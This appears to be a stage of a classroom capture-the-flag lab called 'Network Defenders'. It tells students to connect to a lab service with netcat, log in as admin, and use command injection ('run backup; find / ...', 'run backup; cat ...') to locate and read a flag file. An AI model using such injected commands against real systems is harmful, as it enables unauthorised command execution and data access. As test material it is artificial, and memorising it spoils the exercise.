================== STAGE 5: FLAG CAPTURE ==================

OBJECTIVE: 
Locate and retrieve the final flag file.

INSTRUCTIONS:
1. Connect to the service on port 4444 using netcat
2. Use your command injection capability to locate and read the flag

COMMANDS:
  $ nc defense-service 4444
  
Once connected:
  > login admin [password]       (use the credentials from Stage 3)
  > run backup; find / -name '*flag*' 2>/dev/null   (search for flag files)
  > run backup; cat /path/to/flag                   (read the flag file)

EXPECTED OUTCOME:
You should be able to locate and retrieve the flag value from a file on the
system. This is the final objective of the challenge.

HINTS:
- The flag is likely in a file with "flag" in its name
- Common locations: /root/, /flags/, /opt/flag
- Use the find command to search the filesystem
- Try: find / -name '*flag*' 2>/dev/null
- Once you find a potential flag file, use cat to read it
- The flag format will be: flag{...}

CONGRATULATIONS on completing the Network Defenders challenge!
When you capture the flag, be sure to submit it to your instructor.
